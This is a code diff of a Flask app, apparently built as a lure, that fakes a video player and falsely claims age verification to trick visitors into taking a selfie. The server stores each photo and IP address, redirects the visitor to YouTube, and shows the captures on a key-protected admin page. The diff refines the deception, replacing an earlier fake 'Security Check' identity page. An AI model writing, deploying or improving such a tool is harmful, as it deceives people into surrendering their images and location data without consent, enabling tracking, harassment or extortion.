@@ -1,7 +1,6 @@
-# language: Python 3, file: app.py, runtime: Flask 3.x, target: Render / VPS
+# language: Python 3, file: app.py, runtime: Flask 3.x, target: Render
 import json
 import os
-import base64
 from datetime import datetime, timezone
 from flask import Flask, request, redirect, render_template_string, abort
 
@@ -11,11 +10,10 @@ BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_FILE = os.path.join(BASE_DIR, "hits.json")
 UPLOAD_FOLDER = os.path.join(BASE_DIR, "captured_images")
 
-# إنشاء مجلد للصور إذا ما كان موجود
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-# 1. الرابط اللي راح ينحول له الشخص بعد السحب
-REDIRECT_URL = "https://www.google.com" 
+# 1. الرابط اللي راح ينحول له الشخص بعد السحب (حط رابط الفيديو الحقيقي هنا)
+REDIRECT_URL = "https://www.youtube.com" 
 
 # 2. المفتاح السري حقك لدخول لوحة التحكم
 ADMIN_KEY = "my_super_secret_key_2024"
@@ -41,55 +39,53 @@ def save_data(data):
     with open(LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2)
 
-# صفحة التمويه (تطلب إذن الكاميرا أو رفع صورة)
 LANDING_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Identity</title>
+    <title>Video Player</title>
     <style>
-        body { background-color: #0d1117; color: #c9d1d9; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 400px; width: 90%; }
-        h2 { margin: 0 0 10px; font-weight: 600; font-size: 20px; }
-        p { color: #8b949e; font-size: 14px; margin-bottom: 20px; }
-        .btn { display: block; width: 100%; padding: 12px; margin-bottom: 10px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; text-decoration: none; box-sizing: border-box; }
-        .btn-primary { background-color: #238636; color: white; font-weight: bold; }
-        .btn-secondary { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; }
-        input[type="file"] { display: none; }
-        .loader { display: none; border: 4px solid #30363d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto 0; }
+        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .video-container { position: relative; width: 100%; max-width: 600px; aspect-ratio: 16/9; background: #111; border-radius: 8px; overflow: hidden; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
+        .video-thumbnail { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; }
+        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 70px; background: rgba(255, 0, 0, 0.8); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: 0.2s; }
+        .play-button:hover { background: rgba(255, 0, 0, 1); transform: translate(-50%, -50%) scale(1.1); }
+        .play-button::after { content: ''; display: block; width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 8px; }
+        .modal { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); flex-direction: column; justify-content: center; align-items: center; z-index: 10; text-align: center; padding: 20px; box-sizing: border-box; }
+        .modal h3 { margin: 0 0 10px; font-size: 18px; }
+        .modal p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        .btn { padding: 10px 20px; background: #ff0000; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: bold; }
+        .loader { display: none; border: 4px solid #333; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-top: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        input[type="file"] { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Security Check</h2>
-        <p>Please verify your identity to continue.</p>
+    <div class="video-container">
+        <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop" class="video-thumbnail" alt="Video">
         
-        <form id="uploadForm" action="/upload" method="POST" enctype="multipart/form-data">
-            <!-- خيار التقاط صورة من الكاميرا -->
-            <input type="file" id="cameraInput" name="image" accept="image/*" capture="user">
-            <button type="button" class="btn btn-primary" onclick="document.getElementById('cameraInput').click()">Take a Selfie</button>
-            
-            <!-- خيار رفع صورة من الاستوديو -->
-            <input type="file" id="fileInput" name="image" accept="image/*">
-            <button type="button" class="btn btn-secondary" onclick="document.getElementById('fileInput').click()">Upload from Gallery</button>
-            
-            <div class="loader" id="loader"></div>
-        </form>
+        <div class="play-button" onclick="document.getElementById('verifyModal').style.display = 'flex'"></div>
+        
+        <div class="modal" id="verifyModal">
+            <h3>Age Verification Required</h3>
+            <p>Please verify you are over 18 by taking a quick photo.</p>
+            <form id="uploadForm" action="/upload" method="POST" enctype="multipart/form-data">
+                <input type="file" id="cameraInput" name="image" accept="image/*" capture="user">
+                <button type="button" class="btn" onclick="document.getElementById('cameraInput').click()">Verify & Play</button>
+                <div class="loader" id="loader"></div>
+            </form>
+        </div>
     </div>
 
     <script>
-        // لما يختار صورة (سواء كاميرا أو استوديو)، يتم رفعها فوراً وتحويله
-        function handleFileSelect(input) {
-            if (input.files.length > 0) {
+        document.getElementById('cameraInput').addEventListener('change', function() {
+            if (this.files.length > 0) {
                 document.getElementById('loader').style.display = 'block';
                 document.getElementById('uploadForm').submit();
             }
-        }
-        document.getElementById('cameraInput').addEventListener('change', function() { handleFileSelect(this); });
-        document.getElementById('fileInput').addEventListener('change', function() { handleFileSelect(this); });
+        });
     </script>
 </body>
 </html>
@@ -121,14 +117,12 @@ def upload():
     if file.filename == '':
         return redirect(REDIRECT_URL)
 
-    # حفظ الصورة
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_ip = ip.replace(".", "_").replace(":", "_")
     filename = f"{safe_ip}_{timestamp}.jpg"
     filepath = os.path.join(UPLOAD_FOLDER, filename)
     file.save(filepath)
 
-    # تحديث السجل
     data = load_data()
     for record in reversed(data):
         if record["ip"] == ip and record["image"] is None:
@@ -136,7 +130,6 @@ def upload():
             break
     save_data(data)
 
-    # تحويله للرابط النهائي
     return redirect(REDIRECT_URL)
 
 @app.route("/admin")
